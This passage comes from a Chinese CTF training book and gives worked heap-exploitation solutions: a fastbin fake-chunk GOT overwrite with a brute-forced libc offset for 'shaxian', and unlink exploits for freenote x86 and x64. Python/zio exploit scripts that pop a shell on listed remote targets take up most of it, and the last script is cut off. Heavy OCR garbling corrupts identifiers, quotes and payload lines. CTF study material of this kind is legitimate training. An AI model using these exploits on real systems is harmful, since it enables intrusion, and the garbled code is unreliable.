空间，可以读入60字节，导致覆盖了自身结构体中的nex指针。
cai_ptr=（int）malloc（0x28u）;
if（cai_ptr）
*（_DwORD*)（cai_ptr+36）=v2;
read_buff（0,（char*)（cai_ptr+4),60,10);
puts("How many?");
v0=cai_ptr;
*（_DWORD *)vO=get_int（）;
puts("Add to GOUWUCHE");
result=total_number+++1;
图13-32shaxian关键溢出点反编译代码
信息泄露，通过覆盖next指针，使其指向任意地址，可以泄露出
该地址处的内容。但是为了保证循环能够正常退出，需要保证
fake_v1->next==0。因为got表地址后面都是0，因此可以泄露出got表
中的内容。信息泄露关键点反编译代码如图13-33所示。
puts("Cart:");
while（v1）
printf（"%s*%d\n",v1->name,v1->num);
v1=v1->next;
printf("Total:%d\n",total_number);
---
## Page 529
CTF特训营：技术详解、解题方法与
13.4真题解析
529/1144
图13-33
3shaxian信息泄露关键点反编译代码
因为本程序中申请的堆大小都固定为0x28，所以采用fastbin的利
用方法。
首先，在cai_ptr处伪造一个假的堆块fake_chunk，然后修改next
指针使其指向该fakechunk，最后通过free成功释放该fakechunk
再次申请时，该fake_chunk将被分配，刚好能够实现4字节任意地址
写任意数据（将atoi_got改写为system）。fakechunk选址如图13-34
所示。
:0804B1BA
db
?
:0804B1BB
db
?
:0804B1BC
db
?
:0804B1BD
db
?
:0804B1BE
db
?
；
:0804B1BF
db
?
:0804B1C0
cai_ptr
pp
:0804B1C0
:0804B1C4
align 20h
:0804B1E0 address
db
？；
:0804B1E0
:0804B1E1
db
?
3
:0804B1E2
db
?
3
:0804B1E3
db
---
## Page 530
CTF特训营：技术详解、解题方法与
13.4真题解析
530/1144
图13-34fakechunk选址
可以发现，程序没有给libc，而且根据泄露的地址发现，本地
libcdatabase也没有找到对应的库，没法找到泄露出来的atoi和system
之间的偏移。根据以前的经验，system地址与atoi相距并不远（atoi
在前，system在后），而且这些库函数的地址大都比较规整，为0x10
的整数倍，于是想出暴力破解的思路。为了防止卡死，直接发送cat
home/ctf/flag下面的文件，根据读取的返回值，决定偏移是否成功。
虽然偏移不会很大，但是为了节省时间，这里分了几个区段进行
暴力破解，如从以0x0、0x5000、0xa000、0xc00开头的距离开始破
解，最终求得偏移为0xe130，代码如下：
import struct
from zio import*
#target=(119.254.101.197,10000)
#target='/shaxian
target=(180.76.178.48',23333)
def input_info(io):
io.read_until(Address:)
io.writeline(132(0)+132(0x31)
io.read_until('number:)
io.writeline(a*244+132(0x31))
def dian_cai(io,name,num):
io.read_until('choose:)
io.writeline(`1)
io.readuntil(Jianjiao
io.writeline(name)
（）gunpeero
io.writeline(str(num))
---
## Page 531
CTF特训营：技术详解、解题方法与
13.4真题解析
531/1144
def sublitio):
io.read_until(choose:)
io.writeline(2)
def receipt(io, taitou):
io.read_until('choose:)
io.writeline(3)
io.read_until(Taitou:)
io.writeline(taitou)
def review(io):
io.read_until('choose:)
io.writeline(4)
def link_heap(io):
io.read_until('choose:)
io.writeline('4)
io.read_until(2\n)
heap_ptr = (32(io.read(4))
print hex(heap_ptr)
return heap_ptr
def leak_lib(io):
io.read_until(choose:)
io.writeline('4")
io.read_until(*)
d = io.readline().strip(n)
returnint（d,10）&0xffff
def pwn (target, dis):
io =zio(target, timeout=10000,print_read=COLORED(RAW,red), print_write=
COLORED(RAW,green))
#io=zio（target,timeout=10000,print_read=None,print_write=None)
input _info（io)
dian_cai(io,aaa',1)
read_got=0x0804b010
atoi_got=0x0804B038
#puts_got=0x0804b02c
payload =a*32+l32(atoi_got-4)
dian_cai(io,payload,2)
atoi_addr=link_heap(io)
#system_addr=0xf7e39190
payload2='a*32+132(0x0804B1C0-8)
dian_cai（io,payload2,3)
sublit(io)
payload='a*4+l32(atoi_got)
offset_read =0x000da8d0
---
## Page 532
CTF特训营：技术详解、解题方法与
13.4真题解析
532/1144
offset_system=0x0003e800
offset_puts=0x000656a0
offset_atoi=0x0002fbb0
#libc_base=atoi_addr-offset_atoi
#system_addr=libc_base+offset_system
#system_addr=libc_base +offset_puts
system_addr= atoi_addr+ dis
system_addr = struct.unpack("r",132(system_addr))[0]
sublit(io)
dian_cai(io,payload, system_addr)
#io.writeline(/bin/cat/home/shaxian/flag
io.writeline(/bin/shin)
io.interact()
#data= io.read(1024)
data=io.read until timeout（1)
if“RCTF"in data or“No such file”in data:
print"herre"
file_w = open("flga-4002", w)
data +="dis:”+hex(dis)+“com:”+hex(offset_system -offset_atoi)
file_w.write(data)
file_w.close()
exit(O)
else:
io.close()
#print"ok:"
#io.interact()
dis=0x100
dis =0xe130
while dis < Oxffff:
try:
print hex(dis)
pwn(target, dis)
except Exception,e:
pass
else:
pass
finally:
dis+=0x10
5.{XMAN夏令营练习题}levev6_x86（freenote-x86）
---
## Page 533
CTF特训营：技术详解、解题方法与
13.4真题解析
533/1144
该题是32位程序，逻辑很简单，直接使用13.3.2节中介绍的
unlink方法进行利用即可。
from zio import *
target ="/freenote_x86"
target=("pwn2.jarvisoj.com",9885)
def get_io(target):
r_m=COLORED（RAW,"green")
w_m=COLORED（RAW,“blue”)
io=zio（target, timeout =9999,print_read=r_m,print_write =w_m)
return io
def list note(io):
io.read_until(":")
io.writeline("1")
defnew_note(io,length,content):
io.read_until(":")
io.writeline("2")
io.read_until(":")
io.writeline(str(length))
io.read_until(:")
io.write(content)
def edit_note(io,index,length,content):
jo.read_until(":")
io.writeline("3")
io.read_until(":")
io.writeline(str（index))
io.read_until(":")
io.writeline(str(length)
io.read until(":")
io.write(content)
def delete_note(io,index):
io.read_until(":“")
io.writeline("4")
io.read_until(":")
io.writeline(str(index)
def pwn(io):
new_note(io,0x80,a*0x80)
new_note(io,0x80,a0x80)
new_note(io,0x80,a0x80)
new_note(io,0x80,a*0x80)
new_note(io,0x80,a*0x80)
---
## Page 534
CTF特训营：技术详解、解题方法与
13.4真题解析
534/1144
delete_note(io,1)
delete_note(io,3)
edit _note（io,0,0x8C,“a"*0x8C）
list_note(io)
io.read_until("a"*0x8C)
data=io.read_until(n")[:-1]
print [c for c in data]
heap_addr = 132(data[:4].ljust(4,"x00")
manager_addr=heap_addr-0xdb0 +0x8
print "heap_addr:", hex(heap_addr)
print“manager_addr:",hex(manager_addr)
#node0 addr set
node0_addr=manager_addr+0x8+0xC*0+0x8
#usefull code begin
bits=32#64
if bits == 32:
p_func=132
field size=4
else:
p_func=164
field_size=8
p0 =p_func(0x0)
p1=p_func(0x81)
p2=p_func(node0_addr-3*field_size)
p3=p_func(node0 addr-2*field size）
node1_pre_size=p_func(0x80）
node1size=p_func（0x80+2*field size）
+zisdpou+（,zispey-oxsn+d+d+d+od=oeep
node1size
#edit node 0, over write node 1
edit_note(io,0,len（data0),data0)
#delete node 1unlink node 0
delete_note(io,1)
#usefull code end
strtol_got
=0x0804a2bc
offset_strtol
=0x32bd0
strtol_plt
= 0x080484c0
offset_system=0x3e800
#remote
offset_strtol
=0x34640
#strtol_plt
=0x0000000000400760
offset_system = 0x40310
---
## Page 535
CTF特训营：技术详解、解题方法与
13.4真题解析
535/1144
payload ="
payload +=I32(0x02)
payload+=132(0x01)
payload +=132(0x4)
payload+=I32(strtol_got)
payload =payload.ljust(0x88,a)
edit note(io,0,len（payload）,payload)
list_note(io)
io.read_until("O.")
data = io.read_until（n")[:-1]
strtol_addr=132(data[:4].ljust(4,x00))
print“strtol_addr:",hex(strtol_addr)
libcbase=strtol_addr-offset_strtol
system_addr=libc_base+offset_system
print"system_addr:",hex(system_addr)
payload +=|32(system_addr)
payload =
io.gdb_hint()
edit_note(io,O,len（payload),payload)
io.writeline(/bin/sh;")
io.interact()
io =get_io（target)
pwn(io)
6.{XMAN夏令营练习题}levev6-x64（freenote-x64）
该题是64位程序，逻辑很简单，直接使用13.3.2节中介绍的
unlink方法进行利用即可。
fromzio import*
target="/freenote_x64"
target=("pwn2.jarvisoj.com",9886)
def get_io（target):
r_m=COLORED（RAW,“green")
w_m=COLORED（RAW,blue")
---
## Page 536
CTF特训营：技术详解、解题方法与
13.4真题解析
536/1144
return io
def list_note(io):
io.read_until(:"）
io.writeline("1")
def new_note(io,length,content):
io.read_until(":")
io.writeline("2")
io.read_until(":")
io.writeline(str(length))
io.write(content)
def edit_note（io,index,length,content):
io.read_until(*:")
io.writeline("3")
（)un peero
io.writeline(str（index))
io.read until(:“）
io.writeline(str(length)
）npero
io.write(content)
def delete_note(io,index):
io.read_until(":")
io.writeline("4")
io.read_until(":")
io.writeline(str(index)
def pwn(io):
new_note(io,0x80,'a0x80)
new_note（io,0x80,'a*0x80)
new_note(io,0x80,'a*0x80)
new_note(io,0x80,'a*0x80)
new_note（io,0x80,a*0x80）